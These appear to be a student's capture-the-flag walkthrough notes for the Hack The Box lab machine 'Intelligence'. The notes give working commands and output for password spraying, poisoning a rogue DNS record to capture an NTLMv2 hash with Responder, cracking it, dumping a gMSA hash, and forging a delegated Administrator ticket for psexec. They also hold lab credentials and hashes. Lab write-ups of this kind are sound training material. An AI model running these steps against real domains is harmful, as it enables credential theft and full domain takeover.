@@ -1,0 +1,788 @@
+HTB - Windows - Intelligence - Active Directory Enumeration, NTLM Hashes, PDF Leaks
+
+Ton of ports open, most likely Active Directory, recent windows version, kerberos enabled.
+LDAP Leaks Domain, edit hosts file to include it.
+COMMANDS:
+=============================================================================================
+# HTB
+10.10.10.248 intelligence.htb intelligence dc.intelligence.htb
+=============================================================================================
+
+Clock skew is seen, we can sync time with ntp if need be.
+Web server is available, but we try to test the rpc protocol, will use crackmapexec and 
+rpcclient.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/nmap]
+└─$ rpcclient -U '' -N 10.10.10.248 
+rpcclient $> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> 
+
+┌──(kali㉿kali)-[~/htb/windows/intelligence/nmap]
+└─$ crackmapexec smb 10.10.10.248                            
+SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+                                                              
+=============================================================================================
+
+No real enumeration from using null authentication.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/nmap]
+└─$ crackmapexec smb 10.10.10.248 -u '' --shares
+SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
+=============================================================================================
+
+We can now go look at the website. We can test for virtual host routing by going to the
+different domain names on the web client. However, there is no difference.
+
+Open up developer tools, subscribe and add a phony email to the main web page and check
+output on the network tab.
+
+No actual data sent upon hitting susbscribe button. No host requests only get requests.
+Potential username of "contact".
+
+We can download 2 documents, which have a name of [date]-upload.pdf
+
+We can try and create a wordlist out of dates. We will simply use the built-in date command
+and specify the year, month, and day from when to create the output date.
+
+We will do a short script for the whole year of 2020
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/nmap]
+└─$ for i in $(seq 545 910); do date --date="$i day ago" +%Y-%m-%d-upload.pdf; done > files
+=============================================================================================
+
+We will use wget to download all the files since in the metadata wget by default keeps 
+modification stamps that curl does not. For curl you can give it the -R option to keep it.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ for i in $(cat ../files); do wget http://10.10.10.248/documents/$i ; done
+=============================================================================================
+
+Once we finish downloading all possible files from the webserver from the year 2020, we can
+go ahead and use exiftool to extract the files metadata fields.
+COMMANDS:
+=============================================================================================
+sudo apt install libimage-exiftool-perl -y
+exiftool *.pdf | awk -F: '{print $1}' | sort -u
+
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ exiftool *.pdf | awk -F: '{print $1}' | sort -u
+
+..
+..
+..
+
+Creator                         
+Directory                       
+ExifTool Version Number         
+File Access Date/Time           
+File Inode Change Date/Time     
+File Modification Date/Time     
+File Name                       
+File Permissions                
+File Size                       
+File Type                       
+File Type Extension             
+Linearized                      
+MIME Type                       
+Page Count                      
+PDF Version              
+
+..
+..
+..
+=============================================================================================
+
+We can see the different fields from the file metadata with awk and sort -u.
+"Creator" tag will most likely show us the different authors name.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ exiftool *.pdf | grep -i "creator" | awk '{print $3}' | sort -u
+
+Anita.Roberts
+Brian.Baker
+Brian.Morris
+Daniel.Shelton
+Danny.Matthews
+Darryl.Harris
+David.Mcbride
+David.Reed
+David.Wilson
+Ian.Duncan
+Jason.Patterson
+Jason.Wright
+Jennifer.Thomas
+Jessica.Moody
+John.Coleman
+Jose.Williams
+Kaitlyn.Zimmerman
+Kelly.Long
+Nicole.Brock
+Richard.Williams
+Samuel.Richardson
+Scott.Scott
+Stephanie.Young
+Teresa.Williamson
+Thomas.Hall
+Thomas.Valenzuela
+Tiffany.Molina
+Travis.Evans
+Veronica.Patel
+William.Lee
+=============================================================================================
+
+We get a list of usernames. We will use these name with a tool name kerbrute
+COMMANDS:
+=============================================================================================
+sudo apt install gccgo-go 
+sudo apt install golang-go
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ ls
+files  kerbrute_linux_amd64  nmap  notes.txt  pdf
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ mv kerbrute_linux_amd64 kerbrute             
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ ./kerbrute 
+zsh: permission denied: ./kerbrute
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ chmod 755 kerbrute        
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ ./kerbrute 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _
+=============================================================================================
+
+From running kerbrute looks like all 30 users were valid.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ ../kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 06/30/22 - Ronnie Flathers @ropnop
+
+2022/06/30 00:42:56 >  Using KDC(s):
+2022/06/30 00:42:56 >   10.10.10.248:88
+
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
+2022/06/30 00:42:56 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
+=============================================================================================
+
+We can test by creating a false user and test for false positive, but moving on we can attempt
+a password spray with kerbrute to have it run on the background using the usernames we 
+acquired.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ ../kerbrute passwordspray --dc 10.10.10.248 -d intelligence.htb users 'Winter2020!'
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 06/30/22 - Ronnie Flathers @ropnop
+
+2022/06/30 12:45:34 >  Using KDC(s):
+2022/06/30 12:45:34 >   10.10.10.248:88
+
+2022/06/30 12:45:35 >  Done! Tested 30 logins (0 successes) in 1.032 seconds
+=============================================================================================
+
+Next thing we will one to do is try and read all the pdfs we just downloaded.
+We need to download pdftotext
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ sudo apt install poppler-utils 
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ for i in $(ls); do pdftotext $i; done  
+Syntax Warning: May not be a PDF file (continuing anyway)
+Syntax Error: Couldn't find trailer dictionary
+Syntax Error: Couldn't find trailer dictionary
+Syntax Error: Couldn't read xref table
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ cat *.txt | grep password            
+Please login using your username and the default password of:
+After logging in please change your password as soon as possible.
+                                                                      
+=============================================================================================
+
+We look for keywords that contain 'password' and we filter them out with grep
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ cat *.txt | grep -i password -A5 -B5
+
+
+Sit porro tempora porro etincidunt adipisci.
+
+
+New Account Guide
+Welcome to Intelligence Corp!
+Please login using your username and the default password of:
+NewIntelligenceCorpUser9876
+After logging in please change your password as soon as possible.
+
+
+Dolor quisquam aliquam amet numquam modi.
+Sit porro tempora sit adipisci porro sit quiquia. Ut dolor modi magnam ipsum
+velit magnam. Ipsum ut numquam tempora sit. Tempora eius est voluptatem.
+Dolorem numquam consectetur etincidunt etincidunt sed. Neque magnam ipsum modi sit aliquam amet. Amet consectetur modi quisquam adipisci aliquam
+=============================================================================================
+
+From the search we find a default password that we can use as part of the password spraying
+we were conducting.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ ../kerbrute passwordspray --dc 10.10.10.248 -d intelligence.htb users NewIntelligenceCorpUser9876
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 06/30/22 - Ronnie Flathers @ropnop
+
+2022/06/30 12:59:43 >  Using KDC(s):
+2022/06/30 12:59:43 >   10.10.10.248:88
+
+2022/06/30 12:59:44 >  Done! Tested 30 logins (0 successes) in 0.908 seconds
+=============================================================================================
+
+Kerbrute does not seem to be able to authenticate using the password provided, instead we
+use crackmapexec to test out.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876
+SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
+..
+..
+..
+..
+
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+..
+..
+..
+=============================================================================================
+
+We find that the tiffany user has a valid login with the password.
+
+We can try using spider plus for further background enumeration.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares -M spider_plus
+SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+SPIDER_P... 10.10.10.248    445    DC               [*] Started spidering plus with option:
+SPIDER_P... 10.10.10.248    445    DC               [*]        DIR: ['print$']
+SPIDER_P... 10.10.10.248    445    DC               [*]        EXT: ['ico', 'lnk']
+SPIDER_P... 10.10.10.248    445    DC               [*]       SIZE: 51200
+SPIDER_P... 10.10.10.248    445    DC               [*]     OUTPUT: /tmp/cme_spider_plus
+=============================================================================================
+
+If you keep getting errors while enumerating with crackmapexec or kerbrute, then use other
+tools such as smbclient or smbmap
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876         
+[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    READ ONLY       Remote IPC
+        IT                                                      READ ONLY
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+=============================================================================================
+
+SMBMAP does the tirck and have read access on a couple of shares
+
+We can also check for the password policy
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/pdf]
+└─$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --pass-pol
+SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
+SMB         10.10.10.248    445    DC               [+] Dumping password info for domain: intelligence
+SMB         10.10.10.248    445    DC               Minimum password length: 7
+SMB         10.10.10.248    445    DC               Password history length: None
+SMB         10.10.10.248    445    DC               Maximum password age: Not Set
+SMB         10.10.10.248    445    DC               
+SMB         10.10.10.248    445    DC               Password Complexity Flags: 000000
+SMB         10.10.10.248    445    DC                   Domain Refuse Password Change: 0
+SMB         10.10.10.248    445    DC                   Domain Password Store Cleartext: 0
+SMB         10.10.10.248    445    DC                   Domain Password Lockout Admins: 0
+SMB         10.10.10.248    445    DC                   Domain Password No Clear Change: 0
+SMB         10.10.10.248    445    DC                   Domain Password No Anon Change: 0
+SMB         10.10.10.248    445    DC                   Domain Password Complex: 0
+SMB         10.10.10.248    445    DC               
+SMB         10.10.10.248    445    DC               Minimum password age: None
+SMB         10.10.10.248    445    DC               Reset Account Lockout Counter: None
+SMB         10.10.10.248    445    DC               Locked Account Duration: None
+SMB         10.10.10.248    445    DC               Account Lockout Threshold: None
+SMB         10.10.10.248    445    DC               Forced Log off Time: Not Set
+=============================================================================================
+
+No password complexity is shown.
+We can now try to use blood hound to do extra recon
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~]
+└─$ pip install bloodhound
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ bloodhound-python -ns 10.10.10.248 -d intelligence.htb -dc dc.intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -c all
+INFO: Found AD domain: intelligence.htb
+INFO: Connecting to LDAP server: dc.intelligence.htb
+=============================================================================================
+
+Alternative to SMBmap to list directories with SMBclient now that we found a shared users
+directory
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ smbclient -U Tiffany.Molina //10.10.10.248/Users NewIntelligenceCorpUser9876 -N
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sun Apr 18 21:20:26 2021
+  ..                                 DR        0  Sun Apr 18 21:20:26 2021
+  Administrator                       D        0  Sun Apr 18 20:18:39 2021
+  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018
+  Default                           DHR        0  Sun Apr 18 22:17:40 2021
+  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018
+  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018
+  Public                             DR        0  Sun Apr 18 20:18:39 2021
+  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
+  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021
+
+=============================================================================================
+
+we can now navigate with SMBclient, and get the user.txt
+COMMANDS:
+=============================================================================================
+smb: \Tiffany.Molina\Desktop\> get user.txt
+getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+=============================================================================================
+
+We try using bloodhound but no real info is laid that could provide an efficient way getting 
+access.
+
+We go to the IT directory that was previously listed and using smbclient download a copy of
+the powershell script from the shared drive.
+COMMANDS:
+=============================================================================================
+──(kali㉿kali)-[~/htb/windows/intelligence/bloodhound-data]
+└─$ smbclient -U Tiffany.Molina //10.10.10.248/IT NewIntelligenceCorpUser9876 -N
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Apr 18 20:50:55 2021
+  ..                                  D        0  Sun Apr 18 20:50:55 2021
+  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021
+
+                3770367 blocks of size 4096. 1460045 blocks available
+smb: \> get downdetector.ps1 
+getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
+=============================================================================================
+
+Let's look at the file
+COMMANDS:
+=============================================================================================
+──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ cat downdetector.ps1 
+��# Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory 
+foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
+try {
+$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+if(.StatusCode -ne 200) {
+Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
+}
+} catch {}
+}
+=============================================================================================
+
+So we have a use in Ted.Graves or Laura which we found in bloodhound.
+The one thing about active directory, anyone can make a domain entry since it has dynamic 
+dns but you can harden it if need be so users can't do it. DHCPs request machine updates active directory to create reverse lookup so you have a domain name. We can do that as our user
+potentially we can do this with dnstool. 
+
+The actual tool is krbrelayx.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/krbrelayx]
+└─$ python dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -r webtest.intelligence.htb -a add -t A -d 10.10.14.5 10.10.10.248
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully
+=============================================================================================
+
+The record is added successfully, we can listen for connect backs as well with netcat.
+If the downdetector script is running periodically than a connect back from the script
+should be successful and we may able to steal the new users credentials.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ sudo nc -lnvp 80
+[sudo] password for kali: 
+listening on [any] 80 ...
+connect to [10.10.14.5] from (UNKNOWN) [10.10.10.248] 56335
+GET / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1852
+Host: webtest
+Connection: Keep-Alive
+
+=============================================================================================
+
+We indeed get a connect back to us we can now use. We can also test stuff by using nslookup
+and see the the that are entry was successful 
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/krbrelayx]
+└─$ nslookup            
+> server 10.10.10.248
+Default server: 10.10.10.248
+Address: 10.10.10.248#53
+> webtest.intelligence.htb
+Server:         10.10.10.248
+Address:        10.10.10.248#53
+
+Name:   webtest.intelligence.htb
+Address: 10.10.14.5
+> testweb.intelligence.htb
+Server:         10.10.10.248
+Address:        10.10.10.248#53
+
+** server can't find testweb.intelligence.htb: NXDOMAIN
+=============================================================================================
+
+Now that we know the script is being run periodically by a user we can run responder to
+get the script to authenticate so we can steal the hash.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.1.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.5]
+    Responder IPv6             [dead:beef:2::1003]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-XWS3G001KXP]
+    Responder Domain Name      [ZMN0.LOCAL]
+    Responder DCE-RPC Port     [45953]
+
+[+] Listening for events...                                                                   
+
+/usr/share/responder/./Responder.py:366: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead
+  thread.setDaemon(True)
+/usr/share/responder/./Responder.py:256: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
+  server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)
+[HTTP] NTLMv2 Client   : ::ffff:10.10.10.248
+[HTTP] NTLMv2 Username : intelligence\Ted.Graves
+[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:6a32d2acee9366cf:0BA2144B1432A6B3D3F6974A48599D8C:0101000000000000397B48EA048DD801E408DF4A73C0B63E00000000020008005A004D004E00300001001E00570049004E002D00580057005300330047003000300031004B0058005000040014005A004D004E0030002E004C004F00430041004C0003003400570049004E002D00580057005300330047003000300031004B00580050002E005A004D004E0030002E004C004F00430041004C00050014005A004D004E0030002E004C004F00430041004C000800300030000000000000000000000000200000A3D4D4FA5382979A3AA87483CD9FECEF36C644F18F6D683054D481B82085C0120A0010000000000000000000000000000000000009003A0048005400540050002F0077006500620074006500730074002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000            
+
+=============================================================================================
+
+We get a hash from the user Ted.Graves you can also capture the hash with an auxilary script
+auxilary/server/capture/http_ntlm
+
+We can just use hashcat to crack the hash.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ hashcat --force -m 5600 hash.txt /usr/share/wordlists/rockyou.txt       
+hashcat (v6.2.5) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+============================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i7-5650U CPU @ 2.20GHz, 1441/2947 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+..
+..
+..
+
+TED.GRAVES::intelligence:6a32d2acee9366cf:0ba2144b1432a6b3d3f6974a48599d8c:0101000000000000397b48ea048dd801e408df4a73c0b63e00000000020008005a004d004e00300001001e00570049004e002d00580057005300330047003000300031004b0058005000040014005a004d004e0030002e004c004f00430041004c0003003400570049004e002d00580057005300330047003000300031004b00580050002e005a004d004e0030002e004c004f00430041004c00050014005a004d004e0030002e004c004f00430041004c000800300030000000000000000000000000200000a3d4d4fa5382979a3aa87483cd9fecef36c644f18f6d683054d481b82085c0120a0010000000000000000000000000000000000009003a0048005400540050002f0077006500620074006500730074002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
+                                                          
+...
+..
+..
+..
+=============================================================================================
+
+We now have the password for the user so let's attempt to authenticate.
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence]
+└─$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy              
+SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
+=============================================================================================
+
+It indeed works, we still can't login with the credential, so we back to bloodhound and find 
+out what we can do with the user now that we have credentials.
+
+We can see that Ted has readgmsapassword since he is IT Support , which has access to
+SVC_INT@INTELLIGENCE.HTB which can delegate.
+
+We can download a tool called gMSADumper and attemptto get credentials for the SVC_INT account
+https://github.com/micahvandeusen/gMSADumper.git
+
+COMMANDS:
+=============================================================================================
+──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ python gMSADumper.py -u ted.graves -p Mr.Teddy -d intelligence.htb
+
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::6bf735e60852b92212d512a4deadcfea
+=============================================================================================
+
+We now have a hash for the account mentioned, we can try and validate with crackmap
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ crackmapexec smb 10.10.10.248 -u SVC_INT$ -H 6bf735e60852b92212d512a4deadcfea 
+SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\SVC_INT$:6bf735e60852b92212d512a4deadcfea 
+=============================================================================================
+
+Because this is an account ending with '$' it is either a machine account or a managed 
+service account. However, with this we can generate a silver ticket but need our dates synched
+
+COMMANDS:
+=============================================================================================
+sudo ntpdate 10.10.10.248
+=============================================================================================
+
+Actually if running from a VM we need to make sure guest urils is turned offotherwise the 
+time is set back.
+
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ sudo service virtualbox-guest-utils stop
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ sudo ntpdate 10.10.10.248
+{"time":"2022-07-01T01:17:26.635116-0400","offset":25200.121156,"precision":0.078895,"host":"10.10.10.248","ip":"10.10.10.248","stratum":1,"leap":"no-leap","adjusted":true}
+CLOCK: time stepped by 25200.121156
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence/svc_int$ -hashes 6bf735e60852b92212d512a4deadcfea:6bf735e60852b92212d512a4deadcfea
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+=============================================================================================
+
+'WWW' is used since the machine is an iis server.
+
+We can export the ticket, by making sure we overwrite the kerberos krb5cc environment variable
+
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass intelligence.htb/Administrator@dc.intelligence.htb
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+sudo service virtualbox-guest-utils stop 
+                                                                                              
+sudo ntpdate 10.10.10.248 
+
+python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l dc.intelligence.htb -d intelligence.htb
+                                                                                              
